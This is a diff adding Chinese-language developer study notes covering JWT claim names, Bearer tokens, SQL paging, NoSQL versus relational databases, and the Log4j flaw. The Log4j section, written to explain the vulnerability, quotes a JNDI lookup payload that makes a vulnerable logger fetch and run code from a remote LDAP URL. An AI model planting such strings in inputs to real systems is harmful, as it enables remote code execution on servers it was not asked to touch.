+         [HttpGet, Route("authorize")]
+         public IActionResult All()
+         {
+             return new ContentResult() { Content = $@"For all client who authorize." };
+         }
+     }
+     ```
+
+### JwtRegisteredClaimNames 屬性
+
+- 在建立使用者的 Claims 聲明時，我們會用到很多 `JwtRegisteredClaimNames` 結構型別，來取得是先定義好的字串
+
+- |   Claim    | 說明                                                 | 連結                                         |
+  | :--------: | :--------------------------------------------------- | -------------------------------------------- |
+  |    Jti     | 表示 JWT ID，Token 的唯一識別碼                      | http://tools.ietf.org/html/rfc7519#section-4 |
+  |    Iss     | 表示 Issuer，發送 Token 的發行者                     | http://tools.ietf.org/html/rfc7519#section-4 |
+  |    Iat     | 表示 Issued At，Token 的建立時間                     | http://tools.ietf.org/html/rfc7519#section-4 |
+  |    Exp     | 表示 Expiration Time，Token 的逾期時間               | http://tools.ietf.org/html/rfc7519#section-4 |
+  |    Sub     | 表示 Subject，Token 的主體內容                       | http://tools.ietf.org/html/rfc7519#section-4 |
+  |    Aud     | 表示 Audience，接收 Token 的觀眾                     | http://tools.ietf.org/html/rfc7519#section-4 |
+  |    Typ     | 表示 Token 的類型，例如 JWT 表示 JSON Web Token 類型 | http://tools.ietf.org/html/rfc7519#section-4 |
+  |    Nbf     | 表示 Not Before，定義在什麼時間之前，不可用          | http://tools.ietf.org/html/rfc7519#section-4 |
+  |   Actort   | 識別執行授權的代理是誰                               | http://tools.ietf.org/html/rfc7519#section-4 |
+  |   NameId   | 使用者識別碼                                         | http://tools.ietf.org/html/rfc7519#section-4 |
+  | FamilyName | 使用者姓氏                                           | http://tools.ietf.org/html/rfc7519#section-4 |
+  | GivenName  | 使用者名字                                           | http://tools.ietf.org/html/rfc7519#section-4 |
+  |   Gender   | 使用者性別                                           | http://tools.ietf.org/html/rfc7519#section-4 |
+  |   Email    | 使用者的電子郵件                                     | http://tools.ietf.org/html/rfc7519#section-4 |
+  | Birthdate  | 使用者生日                                           | http://tools.ietf.org/html/rfc7519#section-4 |
+  |  Website   | 使用者的網站                                         | http://tools.ietf.org/html/rfc7519#section-4 |
+
+
+### Bearer Token 
+
+- HTTP 的認證「Authorization」方案有許多種格式，而 Bearer 就是其中一種且被定義在 Header 中的驗證方案，通常搭配於 JWT 上
+
+- Resource server 是資源服務器，即後端存放用戶生成的 API Token 的服務器。 
+- Authorization server 的意思是認證服務器，即後端專門用來處理認證的服務器
+- 這些東西都是由 [OAuth 2.0](http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html) 中所定義出來的，在定義中說明了 Client 如何取得 Access Token 的方法
+
+
+
+# Others
+
+## SQL 語法
+
+### 跳過N筆資料
+
+- ##### OFFSET N rows 跳過n筆資料列，需搭配order by 告訴server怎麼排序資料
+
+- ##### 搭配 FETCH NEXT 指定取的筆數
+
+  - ```sql
+      SELECT *
+      FROM [ABP].[dbo].[AbpUsers]
+      order by id  /**** 一定要搭配order by 才知道排序 ***/
+      OFFSET 1 ROWS  /****跳過第一筆資料 ***/
+      FETCH NEXT 1 ROWS ONLY;/****取一筆，若沒使用Fetch Next 則取全部 ***/
+    ```
+
+##  Log4j 資安漏洞
+
+- ###### 這次出問題的套件就是 Log4j，而出問題的原因跟我開頭講的一樣，有一個鮮為人知的功能有著安全性的漏洞，只要 Log4j 在記錄 log 時記錄到某個特定格式的東西，就會去執行相對應的程式碼。
+
+- `${jndi:ldap://cymetrics.io/test}`
+
+  - ###### 當 Log4j 紀錄上面那一串字的時候，它發現這串字符合特定格式，就會去裡面的網址（cymetrics.io/test）下載程式碼然後執行，因此這是一個 RCE（Remote Code Execution，遠端程式碼執行）漏洞。
+
+## 高併發處理
+
+
+
+## NoSQL 
+
+- ##### 非關聯式資料庫，將資料儲存為類似 JSON 的文件，並對資料進行查詢，這是一個 document 資料庫模型
+
+- ##### doucment 是 key-value 的有序集合。資料庫中的每個doucment 不需要具有相同的數據結構，你可以將資料儲存在 JSON、XML文件甚至CSV文件 
+
+- ##### 優點：
+
+  - ###### 海量數據下，讀寫性能優異
+
+  - ###### 沒有固定欄位，依需求增加或減少。 
+
+  - ###### 數據間無關係，易於擴展
+
+- ##### 缺點
+
+  - ###### 無架構指導
+
+  - ###### 無歷史資料模型
+
+- ##### 使用時機
+
+  - ##### SQL
+
+    - ###### 重要的資料
+
+    - ###### 資料與資料之間有關聯性
+
+    - ###### 需要複雜的查詢
+
+  - ##### NoSQL
+
+    - ###### 資料量大
+
+      - ###### 由於 NOSQL 相較於 RDBMS 更容易做 horizontal scaling，且本身的設計就是分散式系統的設計。因此對於未來有大量擴充需求的系統，會更容易的去擴充，且擴充的成本也較低。
+
+    - ###### 單純的資料、無關聯
+
+    - ###### 即時性
+
+    - ###### 需搜集未知的資料
+
+    - ###### 經常擴充
+
+### NOSQL 比 RDBMS 快嗎?
+
+- ##### RDBMS 以及 NOSQL 在查詢上最主要的差別在於，RDBMS 可以執行較複雜的查詢，因為 RDBMS 具有關聯的特性
+
+  - ##### 例如有顧客、商品、銷售員三個資料表，分別儲存顧客的個人資料、商品的詳細價格與類別以及銷售員的個人資料，RDBMS 此時可以將三個表依照指定邏輯將他們關聯起來，建立一個含有某個顧客，從某個銷售員手上，購買的某個商品，這樣子的一個資料表。
+
+  - ##### 因此 RDBMS 在查詢上，可能需要跟很多資料表做關聯，等於是多查詢了很多個資料表，因此查詢的時間相對比較長。
+
+- ##### 對比的 NOSQL，因為不包含任何關聯，單筆資料查詢後的所有需要的資料，都存在這一筆資料中，不需要做其他額外的查詢，相較之下會比 RDBMS 快。
+
